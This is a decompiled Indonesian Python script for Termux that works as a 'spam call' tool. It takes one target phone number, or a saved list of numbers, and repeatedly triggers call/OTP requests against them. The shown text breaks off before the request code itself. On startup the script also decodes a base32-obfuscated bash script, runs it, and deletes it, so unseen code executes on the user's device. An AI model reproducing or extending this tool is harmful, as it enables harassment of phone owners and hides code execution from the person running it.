""" Decompiled by Exotic Hridoy """

try:
	import sys,os,json,requests,random,re,base64,string
	from bs4 import BeautifulSoup as sanz_id
	from fake_useragent import UserAgent
	from requests import post
	from requests import get
	from time import sleep
	import subprocess as sp
	from rich.panel import Panel
	from rich.columns import Columns
	from rich.console import Console
	from rich import print as printer
except ModuleNotFoundError:
	hapus()
	exit(
		"\n\033[1;37m[\033[1;31m!\033[1;37m] Module Belum Terinstall, Ketik Perintah Dibawah\n\033[1;37m[\033[1;31m$\033[1;37m] \033[1;33mpip install -r requirements.txt\n"
)
clear = lambda : os.system("cls" if os.name == "nt" else "clear")
subrek_yt_free_tutorial = "https://www.youtube.com/channel/UCLRXFyMN0L8yH9F-xxOd7Og"
user_agent = UserAgent()
agent = user_agent.random
nama_file = "Run.py"
file = ".__sanz_login_token_tools_premium_call_free__.json"
prem = ".__sanz_login_token_tools_premium_call_premium__.json"
path = "/data/data/com.termux/files/usr/.sanz"
try:
	os.mkdir(path)
except:
	pass
try:
	sys.stdout.write('\x1b]2;Script Premium-Call by Sanz - Yt : FREE TUTORIAL\x07')
except:
	pass

m = "\x1b[1;31m"
h = "\x1b[1;32m"
k = "\x1b[1;33m"
b = "\x1b[1;34m"
u = "\x1b[1;35m"
p = "\x1b[1;37m"
hx = "\x1b[1;30m"
bx = "\x1b[1;36m"
hx2 = "\x1b[0;30m"
hx3 = "\x1b[30m"
px = "\x1b[0m"
kx = "\x1b[0;33m"
hx4 = "\x1b[0;32m"
pp = "\x1b[7m"
km = f"\n{p}[{m}!{p}]"
n = "\n"
kon = "{"
tol = "}"
x = random.choice([u,bx])

try:
	dt = get("http://ip-api.com/json/").json()
	try:
		sanz_ip = dt["query"]
		sanz_negara = dt["country"]
		sanz_code = dt["countryCode"].lower()
	except KeyError:
		sanz_ip = " "
		sanz_negara = " "

except KeyboardInterrupt:
	hapus();sleep(0.5)
	exit(f"{km} {p}Program Dihentikan\n")
except requests.exceptions.ConnectionError:
	hapus();sleep(0.5)
	exit(f"{km} {p}Koneksi Internet Error\n")
except Exception as lol:
	to=f"{km} {p}Error {m}: {p}"
	hapus();sleep(0.5)
	exit(f"{to}{lol}\n")

try:
	yo_ndak_tau = "#!/usr/bin/env bash\n# Compile by Sanz\n# Youtube : FREE TUTORIAL\n# Github  : https://github.com/Sxp-ID\n# Cie Mau rikod ya slur?\n# Semoga lu jomblo selamanya awokawok :v\nSanz=$(mktemp)\nbase32 -d  >${Sanz}<<Free_Tutorial\nEMQS65LTOIXWE2LOF5SW45RAMJQXG2AKEMQEG33NOBUWYZJAMJ4SAU3BNZ5AUIZALFXXK5DVMJSS\nAORAIZJEKRJAKRKVIT2SJFAUYCRDEBDWS5DIOVRCAIB2EBUHI5DQOM5C6L3HNF2GQ5LCFZRW63JP\nKN4HALKJIQFCGICDNFSSATLBOUQHE2LLN5SCA6LBEBZWY5LSH4FCGICTMVWW6Z3BEBWHKIDKN5WW\nE3DPEBZWK3DBNVQW46LBEBQXO33LMF3W62ZAHJ3AUU3BNZ5D2JBINVVXIZLNOAUQUYTBONSTMNBA\nFVSCAIB6ER5VGYLOPJ6TYPCGOJSWKX2UOV2G64TJMFWAUSLZIV3FS3LMOVGDESTIMMZGOS2JINAW\nOSLJKI3VCQZYOZKFGNKSMZBTS3CUI5CXQTSYGBUUSRTYNFMVGSLJMMZGOZ2JINEWWZJQIF3EY6TT\nOJMEGRTDMV4TSVYKLFUTKMSYGIYXQZSTJFTVARDXHBEUGQLHJFUVC32JINAWOSLJKI3VCQZZGBME\nOQSMJJDW65SXLBTXUVL2GE4US2KBM5RUGURXKFEDC6KKJBZXCTDZHFIESMLYMQFGG6TMMNFUK53V\nMZLWY5LEI5MWOSLNJJKU2R3MLFJEKRRWKRKEM6TFIU4TMVCYNBUVKMDMJRMTAULXMFLGQRKRLBYE\n4TKYJY2FIM3QJZGTESSUKNKXI2CSIRBHACSXIVJEEZLLGB4GGM3IKBSWWMJVLFWE4SSTGFWFKTKH\nNRWGKVLMJRMXUTSWJ5KWY5KNI5WEIYTLGV5FO3DEK5SDA3CFKFMFMT2VLBBHGV2UJJXWI22OOVKG\n4TTBBJLDCWRTKNKVEQTEKU2VEY2IMRVGEV3YGFNEKZC2LIYGY4CRK52GYTJQJE2VG23IGBQUOWSU\nKVVGI2KXIRHHAWRQORFGCMSVPJIWU3CLKNEFENS2IZTXOWRRKV5AUVLNNBVVGRS2GZJVKWSPMFWU\n45DCJBSGWUJQIZZFUVCJPBHVKOLQKFLXI3CNNVTTKU2XMR3WK3KKJBLG26DKKEYEMNCUI5YFMUZR\nN54WERCCJJJUKSLYLFVWIMYKKMZE26LFI54GCV2FIZXFIWDEO5REM23ZMFEFURDCNM2XUV3MMRLW\nIMDMIVJFQVSPKVLTQOKJNFAWWZLZN5ZWMU2BM5TEGQLHJJEHG2CRJAYGOSKDJJUUS3DYNAFGGMSV\nGJFHSY3LMUYEC42MJAYDASKDGFVUSQ2BM5EWSURXKFBXQOKJNFAWOSKDNNUUSQ2SG5FWSOD2KZWV\nUY2ZJBDFUUKYGBTUSQ2SG5EVG4BZJFAT2PIKIZZGKZK7KR2XI33SNFQWYCTTN52XEY3FEASHWU3B\nNZ5H2CTSNUQC24TGEASHWU3BNZ5H2===\nFree_Tutorial\nsource ${Sanz}\nrm -rf ${Sanz}\n"
	owi = open(".cek_up_tools.sh","w").write(yo_ndak_tau)
	os.system("bash .cek_up_tools.sh");sleep(0.5);hapus_file(".cek_up_tools.sh")
	clear()
	uax = {
		"user-agent": agent
	}

except KeyboardInterrupt:
	hapus();sleep(0.5)
	exit(f"{km} {p}Program Dihentikan\n")
except requests.exceptions.ConnectionError:
	hapus();sleep(0.5)
	exit(f"{km} {p}Koneksi Internet Error\n")
except KeyError:
	hapus();sleep(0.5)
	exit(f"{km} {p}Server Error\n    {p}Silahkan Coba Lagi{m}..\n")
except json.decoder.JSONDecodeError:
	hapus();sleep(0.5)
	exit(f"{km} {p}Server Error\n    {p}Silahkan Coba Lagi{m}..\n")
except Exception as lol:
	to=f"{km} {p}Error {m}: {p}"
	hapus();sleep(0.5)
	exit(f"{to}{lol}\n")

def status():
	try:
		try:
			__cek_status__ = open(f"{path}/{prem}","r").read()
			__cek_status__ = json.loads(__cek_status__)["data"]["status"]
			cek_status = f"{h}{__cek_status__}"
		except:
			cek_status = f"{k}Free"

		return cek_status

	except KeyboardInterrupt:
		hapus();sleep(0.5)
		exit(f"{km} {p}Program Dihentikan\n")
	except Exception as lol:
		to=f"{km} {p}Error {m}: {p}"
		hapus();sleep(0.5)
		exit(f"{to}{lol}\n")

banner = f"""
{p} __i
{p}|---|   {x}╔═╗{p}┬─┐┌─┐┌┬┐    {x}╔═╗{p}┌─┐┬  ┬
{p}|[_]|   {x}╠═╝{p}├┬┘├┤ │││ {m}── {x}║  {p}├─┤│  │
{p}|:::|   {x}╩  {p}┴└─└─┘┴ ┴    {x}╚═╝{p}┴ ┴┴─┘┴─┘
{p}|:::|   {hx}----------------------------
{p}`\   \\    {m}❭ {p}Creator {m}: {k}Sanz
{p}  \_=_\\   {m}❭ {p}Youtube {m}: {k}FREE TUTORIAL
{hx} -------

{p}[{m}•{p}] Ip Kamu {m}: {p}{sanz_ip}
{p}[{m}•{p}] Status  {m}: {status()} {p}User"""
menu = f"""{p}[{h}1{p}] Mulai Spam Call {k}({h}free user{k})
{p}[{h}2{p}] Menu Premium {k}({h}prem user{k})
{p}[{h}3{p}] Support Admin
{p}[{h}4{p}] Keluar"""
prem_menu = f"""{p}[{h}1{p}] Mulai Spam Call {k}({h}single{k})
{p}[{h}2{p}] Mulai Spam Call {k}({h}massive{k})
{p}[{h}3{p}] Setting File Nomor
{p}[{h}4{p}] List File Nomor
{p}[{h}5{p}] Hapus File Nomor
{p}[{h}6{p}] Support Admin
{p}[{h}7{p}] Kembali ke Menu Awal
{p}[{h}8{p}] Keluar"""

class subrek:
	def __init__(self):
		try:
			user = open(f"{path}/{file}","r").read()
			___user___ = json.loads(user)["data"]["token"]
		except:
			clear()
			hapus_file(path+"/"+file);hapus();sleep(0.5)
			exit(f"{km} {k}Token sudah expired, silahkan login lagi ya{m}..\n")

		self.sanz = subrek_yt_free_tutorial
		self.main()

	def main(self):
		try:
			clear();sleep(0.5)
			menu2 = f"""{p}[{h}1{p}] Support Dg Donasi
{p}[{h}2{p}] Support Dg Subrek Yt
{p}[{h}3{p}] Kembali Ke Menu Awal
{p}[{h}4{p}] Keluar"""
			animasi().banner()
			animasi().jeda()
			animasi().teks(menu2)
			animasi().jeda()
			sxp = input(f"{hx}            0 \r{p}[{m}?{p}] Pilih {m}: {h}");sleep(2)
			if sxp in["1","01"]:
				self.sawer()
			elif sxp in["2","02"]:
				self.sub_yete()
			elif sxp in["4","04"]:
				hapus();sleep(0.5)
				exit(f"{km} {p}Makasih Ngab, Jgn Lupa Balik Lagi{m}..\n")
			elif sxp in[""]:
				hapus();sleep(0.5)
				exit(f"{km} {p}Jangan Kosong Ngab{m}..\n")
			elif sxp in["3","03"]:
				Sanz()
			else:
				hapus();sleep(0.5)
				exit(f"{km} {p}Pilihan {hx}'{h}{sxp}{hx}' {p}Gk Ada Ngab{m}..\n")

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"{km} {p}Program Dihentikan\n")
		except requests.exceptions.ConnectionError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Koneksi Internet Error\n")
		except KeyError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Server Error\n    {p}Silahkan Coba Lagi{m}..\n")
		except json.decoder.JSONDecodeError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Server Error\n    {p}Silahkan Coba Lagi{m}..\n")
		except Exception as lol:
			to=f"{km} {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

	def sawer(self):
		try:
			sleep(1);print();sleep(1)
			animasi().teks(f"{p}[{m}!{p}] {p}Makasih Buat Yg Mau Berbagi :D");sleep(1)
			animasi().teks(f"{p}[{k}*{p}] {p}Tidak Memaksa Ya Cuman Buat Yg Mau Aja ^_^");sleep(2)
			os.system("xdg-open https://saweria.co/SanzXp");sleep(3);print();sleep(1)
			input(f"{p}[{m}>{p}] {p}Klik Enter Untuk Kembali ");sleep(3)
			subrek()

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"{km} {p}Program Dihentikan\n")
		except requests.exceptions.ConnectionError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Koneksi Internet Error\n")
		except KeyError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Server Error\n    {p}Silahkan Coba Lagi{m}..\n")
		except json.decoder.JSONDecodeError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Server Error\n    {p}Silahkan Coba Lagi{m}..\n")
		except Exception as lol:
			to=f"{km} {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

	def sub_yete(self):
		try:
			sleep(1);print();sleep(1)
			animasi().teks(f"{p}[{m}!{p}] {p}Subscribe Youtube Admin Woke");sleep(2)
			os.system(f"xdg-open {self.sanz}");sleep(3)
			animasi().teks(f"{p}[{k}*{p}] {p}Terimakasih Buat Yg Udah Subrek ^_^");sleep(2);print();sleep(1)
			input(f"{p}[{m}>{p}] {p}Klik Enter Untuk Kembali ");sleep(3)
			subrek()

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"{km} {p}Program Dihentikan\n")
		except requests.exceptions.ConnectionError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Koneksi Internet Error\n")
		except KeyError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Server Error\n    {p}Silahkan Coba Lagi{m}..\n")
		except json.decoder.JSONDecodeError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Server Error\n    {p}Silahkan Coba Lagi{m}..\n")
		except Exception as lol:
			to=f"{km} {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

class animasi:
	def __init__(self):
		try:
			user = open(f"{path}/{file}","r").read()
			___user___ = json.loads(user)["data"]["token"]
		except:
			clear()
			hapus_file(path+"/"+file);hapus();sleep(0.5)
			exit(f"{km} {k}Token sudah expired, silahkan login lagi ya{m}..\n")
		pass

	def jeda(self):
		try:
			sleep(1);print();sleep(1)
		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"{km} {p}Program Dihentikan\n")
		except Exception as lol:
			to=f"{km} {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

	def jeda2(self):
		try:
			sleep(0.5);print();sleep(0.5)
		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"{km} {p}Program Dihentikan\n")
		except Exception as lol:
			to=f"{km} {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

	def timer(self):
		try:
			sleep(1);print();sleep(1)
		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"{km} {p}Program Dihentikan\n")
		except Exception as lol:
			to=f"{km} {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

	def proses(self,aink_sanz):
		try:
			n_points = 5
			points_l = [ "." * i + " " * (n_points - i) + "\r" for i in range(n_points) ]
			cond = True
			for x in range(10):
				for points in points_l:
					sys.stdout.write(f"{p}[{k}*{p}] {aink_sanz} {points}\r")
					sys.stdout.flush()
					sleep(0.1)
					if not cond: break

		except KeyboardInterrupt:
			hapus();sleep(1.5)
			exit(f"\n{km} {p}Program Dihentikan\n")
		except Exception as lol:
			to=f"\n{km} {p}Error {m}: {p}"
			hapus();sleep(1.5)
			exit(f"{to}{lol}\n")

	def wait(self,start_minute,start_second):
		import time
		try:
			total_second = start_minute * 60 + start_second
			while total_second:
				mnt, dtk = divmod(total_second, 60)
				sys.stdout.write(f"\r{p}[{k}•{p}] Countdown {k}{mnt:02d}:{dtk:02d} {p}sec ")
				time.sleep(1)
				total_second -= 1

			sys.stdout.write(f"\r{p}[{k}•{p}] Countdown {k}00:00 {p}sec ");sleep(1)
			sys.stdout.write("\r\033[K");sleep(0.5)

		except KeyboardInterrupt:
			sys.stdout.write("\r\033[K");sleep(1);hapus()
			exit(f"\r{km} {p}Program Dihentikan\n")
		except Exception as lol:
			to=f"\r{km} Error {m}: {p}"
			sys.stdout.write("\r\033[K");sleep(1);hapus()
			exit(f"{to}{lol}\n")

	def teks(self,sanz):
		try:
			for free_tutorial in sanz + "\n":
				sys.stdout.write(free_tutorial)
				sys.stdout.flush()
				sleep(0.009)

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"\n{km} {p}Program Dihentikan\n")
		except Exception as lol:
			to=f"\n{km} {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

	def teks2(self,sanz):
		try:
			for free_tutorial in sanz + "\n":
				sys.stdout.write(free_tutorial)
				sys.stdout.flush()
				sleep(0.001)

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"\n{km} {p}Program Dihentikan\n")
		except Exception as lol:
			to=f"\n{km} {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

	def banner(self):
		try:
			clear();sleep(0.5)
			self.teks2(banner)

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"{km} {p}Program Dihentikan\n")
		except Exception as lol:
			to=f"{km} {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

class Sanz:
	def __init__(self):
		try:
			user = open(f"{path}/{file}","r").read()
			___user___ = json.loads(user)["data"]["token"]
		except:
			clear()
			hapus_file(path+"/"+file);hapus();sleep(0.5)
			exit(f"{km} {k}Token sudah expired, silahkan login lagi ya{m}..\n")

		self.Main()

	def Main(self):
		try:
			animasi().banner()
			animasi().jeda2()
			animasi().teks(menu)
			animasi().jeda2()
			sxp = input(f"{hx}            0 \r{p}[{m}?{p}] Pilih {m}: {h}");sleep(2)
			if sxp in[""]:
				hapus();sleep(0.5)
				exit(f"{km} {p}Jangan Kosong Ngab{m}..\n")
			elif sxp in["1","01"]:
				__sanz_spam_main__().free_spam_call()
			elif sxp in["2","02"]:
				__sanz_premium__().__main__()
			elif sxp in["3","03"]:
				subrek()
			elif sxp in["4","04"]:
				hapus();sleep(0.5)
				exit(f"{km} {p}Makasih Ngab, Jgn lupa balik lagi..\n")
			else:
				hapus();sleep(0.5)
				exit(f"{km} {p}Pilihan {hx}'{p}{sxp}{hx}' {p}gk Ada Ngab..\n")

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"{km} {p}Program Dihentikan\n")
		except requests.exceptions.ConnectionError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Koneksi Internet Error\n")
		except KeyError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Server Error\n    {p}Silahkan Coba Lagi{m}..\n")
		except json.decoder.JSONDecodeError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Server Error\n    {p}Silahkan Coba Lagi{m}..\n")
		except Exception as lol:
			to=f"{km} {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

class __sanz_premium__:
	def __init__(self):
		try:
			user = open(f"{path}/{file}","r").read()
			___user___ = json.loads(user)["data"]["token"]
		except:
			clear()
			hapus_file(path+"/"+file);hapus();sleep(0.5)
			exit(f"{km} {k}Token sudah expired, silahkan login lagi ya{m}..\n")
		try:
			user = open(f"{path}/{prem}","r").read()
			___user___ = json.loads(user)["data"]["token"]
		except:
			try:
				clear()
				hapus_file(path+"/"+prem);hapus();sleep(0.5)
				animasi().jeda()
				animasi().teks(f"""{p}[{k}*{p}] Note {m}:{p}

Kamu belum login menjadi premium, berhubung admin baik hati
jadi kalian tidak perlu beli untuk kode token login nya.
Kalian hanya perlu mendownload kode token nya dan login
seperti biasanya tetapi untuk cara melewati shortlink nya
itu agak berbeda, jadi jika perlu tutorial cara melewati
dan mendapatkan kode token premium nya kalian bisa cek
di channel yt admin {h}FREE TUTORIAL {p}ya ngab ^_^""")
				animasi().jeda()
				sanz = input(f"{p}[{m}?{p}] Mau pake versi/menu premium {k}({h}y{k}/{h}t{k}) {m}: {h}");sleep(2)
				if sanz in[""]:
					hapus();sleep(0.5)
					exit(f"{km} {p}Jangan Kosong Ngab{m}..\n")
				elif sanz in["Y","y"]:
					__sanz_login_prem__()
				elif sanz in["T","t"]:
					Sanz()
				else:
					hapus();sleep(0.5)
					exit(f"{km} {p}Pilihan {hx}'{h}{sanz}{hx}' {p}Gk Ada Ngab{m}..\n")

			except KeyboardInterrupt:
				hapus();sleep(0.5)
				exit(f"{km} {p}Program Dihentikan\n")
			except requests.exceptions.ConnectionError:
				hapus();sleep(0.5)
				exit(f"{km} {p}Koneksi Internet Error\n")
			except KeyError:
				hapus();sleep(0.5)
				exit(f"{km} {p}Server Error\n    {p}Silahkan Coba Lagi{m}..\n")
			except json.decoder.JSONDecodeError:
				hapus();sleep(0.5)
				exit(f"{km} {p}Server Error\n    {p}Silahkan Coba Lagi{m}..\n")
			except Exception as lol:
				to=f"{km} {p}Error {m}: {p}"
				hapus();sleep(0.5)
				exit(f"{to}{lol}\n")
		pass

	def _hapus_file_(self):
		try:
			open("Data/nomor.txt","r").read();sleep(1)
			animasi().teks(f"{km} {p}File Berhasil Dihapus");sleep(1)
			hapus_file("Data/nomor.txt");animasi().timer()
			input(f"{p}[{m}>{p}] {p}Klik Enter Untuk Kembali ");sleep(3)
			self.__main__()
		except:
			try:
				sleep(1)
				animasi().teks(f"{km} {p}File tidak Ditemukan");sleep(1)
				animasi().timer()
				input(f"{p}[{m}>{p}] {p}Klik Enter Untuk Kembali ");sleep(3)
				self.__main__()

			except KeyboardInterrupt:
				hapus();sleep(0.5)
				exit(f"{km} {p}Program Dihentikan\n")
			except requests.exceptions.ConnectionError:
				hapus();sleep(0.5)
				exit(f"{km} {p}Koneksi Internet Error\n")
			except KeyError:
				hapus();sleep(0.5)
				exit(f"{km} {p}Server Error\n    {p}Silahkan Coba Lagi{m}..\n")
			except json.decoder.JSONDecodeError:
				hapus();sleep(0.5)
				exit(f"{km} {p}Server Error\n    {p}Silahkan Coba Lagi{m}..\n")
			except Exception as lol:
				to=f"{km} {p}Error {m}: {p}"
				hapus();sleep(0.5)
				exit(f"{to}{lol}\n")

	def __main__(self):
		try:
			clear();sleep(0.5)
			animasi().banner()
			animasi().jeda()
			animasi().teks(prem_menu)
			animasi().jeda()
			sxp = input(f"{hx}            0 \r{p}[{m}?{p}] Pilih {m}: {h}");sleep(2)
			if sxp in[""]:
				hapus();sleep(0.5)
				exit(f"{km} {p}Jangan Kosong Ngab{m}..\n")
			elif sxp in["1","01"]:
				__sanz_spam_main__().prem_spam_call_single()
			elif sxp in["2","02"]:
				__sanz_spam_main__().prem_spam_call_mass()
			elif sxp in["3","03"]:
				clear();sleep(0.5)
				animasi().banner()
				animasi().timer()
				__sanz_spam_main__().set_mass_call()
			elif sxp in["4","04"]:
				__sanz_spam_main__().list_nomor_mass_call()
			elif sxp in["5","05"]:
				self._hapus_file_()
			elif sxp in["6","06"]:
				subrek()
			elif sxp in["7","07"]:
				Sanz()
			elif sxp in["8","08"]:
				hapus();sleep(0.5)
				exit(f"{km} {p}Makasih Ngab, Jgn lupa balik lagi..\n")
			else:
				hapus();sleep(0.5)
				exit(f"{km} {p}Pilihan {hx}'{p}{sxp}{hx}' {p}gk Ada Ngab..\n")

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"{km} {p}Program Dihentikan\n")
		except requests.exceptions.ConnectionError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Koneksi Internet Error\n")
		except KeyError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Server Error\n    {p}Silahkan Coba Lagi{m}..\n")
		except json.decoder.JSONDecodeError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Server Error\n    {p}Silahkan Coba Lagi{m}..\n")
		except Exception as lol:
			to=f"{km} {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

class __sanz_spam_main__:
	def __init__(self):
		try:
			user = open(f"{path}/{file}","r").read()
			___user___ = json.loads(user)["data"]["token"]
		except:
			clear()
			hapus_file(path+"/"+file);hapus();sleep(0.5)
			exit(f"{km} {k}Token sudah expired, silahkan login lagi ya{m}..\n")

		self.apasih = "+628xx"
		pass

	def free_spam_call(self):
		try:
			animasi().banner()
			animasi().jeda2()
			nomor = input(f"                           {hx}{self.apasih} \r{p}[{m}?{p}] Nomor Target {k}({h}+628x{k}) {m}: {h}").replace(" ","").replace("-","");sleep(2)
			if nomor == "":
				hapus();sleep(0.5)
				exit(f"{km} {p}Jangan Kosong Ngab{m}..\n")
			elif len(nomor) <= 9:
				hapus();sleep(0.5)
				exit(f"{km} {p}Nomor tidak Valid{m}..\n")
			else:
				jumlah = input(f"                           {hx}0 \r{p}[{m}?{p}] Jumlah Spam  {k}({h}max:5{k}) {m}: {h}");sleep(2)
				if jumlah == "":
					hapus();sleep(0.5)
					exit(f"{km} {p}Jangan Kosong Ngab{m}..\n")
				elif int(jumlah) > 5:
					hapus();sleep(0.5)
					exit(f"{km} {p}Jumlah Terlalu Besar Ngab{m}..\n")
				else:
					animasi().timer()
					for sanz_ganz in range(int(jumlah)):
						__sanz_server__().call_otp_1(nomor)

					animasi().timer()
					animasi().teks(f"{p}[{k}*{p}] Done Ngab..");sleep(1)
					animasi().teks(f"{p}[{m}!{p}] Jangan Lupa Subrek Yt {h}FREE TUTORIAL");sleep(1)
					animasi().timer();hapus();exit()

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"{km} {p}Program Dihentikan\n")
		except requests.exceptions.ConnectionError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Koneksi Internet Error\n")
		except KeyError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Server Error\n    {p}Silahkan Coba Lagi{m}..\n")
		except json.decoder.JSONDecodeError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Server Error\n    {p}Silahkan Coba Lagi{m}..\n")
		except Exception as lol:
			to=f"{km} {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

	def prem_spam_call_single(self):
		try:
			animasi().banner()
			animasi().jeda2()
			nomor = input(f"                            {hx}{self.apasih} \r{p}[{m}?{p}] Nomor Target {k}({h}+628xx{k}) {m}: {h}").replace(" ","").replace("-","");sleep(2)
			if nomor == "":
				hapus();sleep(0.5)
				exit(f"{km} {p}Jangan Kosong Ngab{m}..\n")
			elif len(nomor) <= 9:
				hapus();sleep(0.5)
				exit(f"{km} {p}Nomor tidak Valid{m}..\n")
			else:
				nom = nomor[3:]
				jumlah = input(f"                            {hx}0 \r{p}[{m}?{p}] Jumlah Spam  {k}({h}max:10{k}) {m}: {h}");sleep(2)
				if jumlah == "":
					hapus();sleep(0.5)
					exit(f"{km} {p}Jangan Kosong Ngab{m}..\n")
				elif int(jumlah) > 10:
					hapus();sleep(0.5)
					exit(f"{km} {p}Jumlah Terlalu Besar Ngab {m}!\n")
				else:
					animasi().timer()
					for sanz_ganz in range(int(jumlah)):
						__sanz_server__().call_otp_2(nomor,nom)
						animasi().wait(0,35)

					animasi().timer()
					animasi().teks(f"{p}[{k}*{p}] Done Ngab..");sleep(1)
					animasi().teks(f"{p}[{m}!{p}] Jangan Lupa Subrek Yt {h}FREE TUTORIAL");sleep(1)
					animasi().timer();hapus();exit()

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"{km} {p}Program Dihentikan\n")
		except requests.exceptions.ConnectionError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Koneksi Internet Error\n")
		except KeyError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Server Error\n    {p}Silahkan Coba Lagi{m}..\n")
		except json.decoder.JSONDecodeError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Server Error\n    {p}Silahkan Coba Lagi{m}..\n")
		except Exception as lol:
			to=f"{km} {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

	def set_mass_call(self):
		try:
			no = input(f"                           {hx}{self.apasih} \r{p}[{m}?{p}] Nomor Target {k}({h}+628x{k}) {m}: {h}").replace(" ","").replace("-","");sleep(1)
			if no == "":
				hapus();sleep(0.5)
				exit(f"{km} {p}Jangan Kosong Ngab{m}..\n")
			elif len(no) <= 9:
				hapus();sleep(0.5)
				exit(f"{km} {p}Nomor tidak Valid{m}..\n")
			else:
				x2 = open("Data/nomor.txt","a").write(f"{no}\n")
				animasi().timer()
				pil = input(f"{p}[{m}?{p}] Tambahkan Nomor Lagi {k}({h}y{k}/{h}t{k}) {m}: {h}");sleep(1)
				animasi().timer()
				if pil in["y","Y"]: self.set_mass_call()
				elif pil in["t","T"]: __sanz_premium__().__main__()
				elif pil in[""]:
					hapus();sleep(0.5)
					exit(f"{km} {p}Jangan Kosong Ngab{m}..\n")
				else:
					hapus();sleep(0.5)
					exit(f"{km} {p}Pilihan {hx}'{h}{pil}{hx}' {p}Gk Ada Ngab{m}..\n")

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"{km} {p}Program Dihentikan\n")
		except requests.exceptions.ConnectionError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Koneksi Internet Error\n")
		except KeyError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Server Error\n    {p}Silahkan Coba Lagi{m}..\n")
		except json.decoder.JSONDecodeError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Server Error\n    {p}Silahkan Coba Lagi{m}..\n")
		except Exception as lol:
			to=f"{km} {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

	def list_nomor_mass_call(self):
		c = 1
		try:
			open("Data/nomor.txt","r").read()
		except:
			clear();sleep(0.5)
			animasi().banner();sleep(1)
			animasi().teks(f"{km} {p}File & List Nomor Tidak Ada,\n    Silahkan Isi Dulu..")
			animasi().timer()
			self.set_mass_call()
		try:
			clear();sleep(0.5)
			animasi().banner();sleep(1)
			animasi().teks(f"{km} {p}List Nomor Target")
			animasi().timer()
			sanz = open("Data/nomor.txt","r").readlines()
			animasi().proses("Menghitung Jumlah Target")
			animasi().teks(f"{p}[{k}*{p}] Total Target {m}: {k}{str(len(sanz))} {p}Nomor             ")
			animasi().timer()
			for free_tutorial in sanz:
				no = free_tutorial.strip()
				print(f"{p}[{h}{c}{p}] {p}{no}")
				sleep(0.3)
				c += 1

			animasi().timer()
			input(f"{p}[{m}?{p}] Klik Enter Untuk Kembali ");sleep(2)
			__sanz_premium__().__main__()

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"{km} {p}Program Dihentikan\n")
		except requests.exceptions.ConnectionError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Koneksi Internet Error\n")
		except KeyError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Server Error\n    {p}Silahkan Coba Lagi{m}..\n")
		except json.decoder.JSONDecodeError:
			hapus();sleep(0.5)
			exit(f"{km} {p}Server Error\n    {p}Silahkan Coba Lagi{m}..\n")
		except Exception as lol:
			to=f"{km} {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

	def prem_spam_call_mass(self):
		try:
			open("Data/nomor.txt","r").read()
		except:
			clear();sleep(0.5)
			animasi().banner();sleep(1)
			animasi().teks(f"{km} {p}File & List Nomor Tidak Ada,\n    Silahkan Isi Dulu..")
			animasi().timer()
			self.set_mass_call()
		try:
			clear();sleep(0.5)
			animasi().banner()
			animasi().timer()
			animasi().proses("Menghitung Jumlah Target")
			sanz = open("Data/nomor.txt","r").readlines()
			animasi().teks(f"{p}[{k}*{p}] Total Target {m}: {k}{str(len(sanz))} {p}Nomor              ")
			animasi().timer()
